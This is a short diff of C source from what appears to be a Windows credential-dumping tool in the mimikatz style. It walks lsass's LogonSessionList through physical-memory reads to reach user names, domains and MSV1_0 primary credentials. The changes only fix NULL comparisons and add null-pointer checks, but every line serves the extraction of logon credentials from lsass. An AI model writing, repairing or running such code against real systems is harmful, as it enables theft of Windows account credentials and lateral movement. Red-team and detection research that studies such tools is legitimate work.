@@ -103,7 +103,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
 
         BasePageVA += 0x1000;
 
-    } while (LogonSessionListHead == NULL && BasePageVA < DataSectionBase + 0x10000);
+    } while (LogonSessionListHead == 0 && BasePageVA < DataSectionBase + 0x10000);
 
 //#if _DEBUG
     //printf("[+] Successfully found LogonSessionList pointer in .data section at 0x%llx\n", LogonSessionListHead);
@@ -137,7 +137,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
 
 
         wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_UserName, lower32bits, LsassPID);
-        if (*UserNameWideString == NULL)
+        if (UserNameWideString == NULL || *UserNameWideString == L'\0')
             UserNameWideString = L"(null)";
 
         char UserNameString[MAX_PATH];
@@ -153,7 +153,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
 
 
         wchar_t* DomainNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_Domain, lower32bits, LsassPID);
-        if (*DomainNameWideString == NULL)
+        if (DomainNameWideString == NULL || *DomainNameWideString == L'\0')
             DomainNameWideString = L"(null)";
 
         char DomainNameString[MAX_PATH];
@@ -178,7 +178,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
         // poi( poi(lsasrv!LogonSessionList) + 0x108)
         TranslateUVA2Physical(Flink + PKIWI_MSV1_0_CREDENTIALS_Credentials, &tmpPA, lower32bits, LsassPID);
         DWORD64 credentialsStruct = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
-        if (credentialsStruct != NULL)
+        if (credentialsStruct != 0)
         {
             // poi( poi( poi(lsasrv!LogonSessionList) + 0x108) + 0x10)
             if (TranslateUVA2Physical(credentialsStruct + PKIWI_MSV1_0_PRIMARY_CREDENTIALS_PrimaryCredentials, &tmpPA, lower32bits, LsassPID))
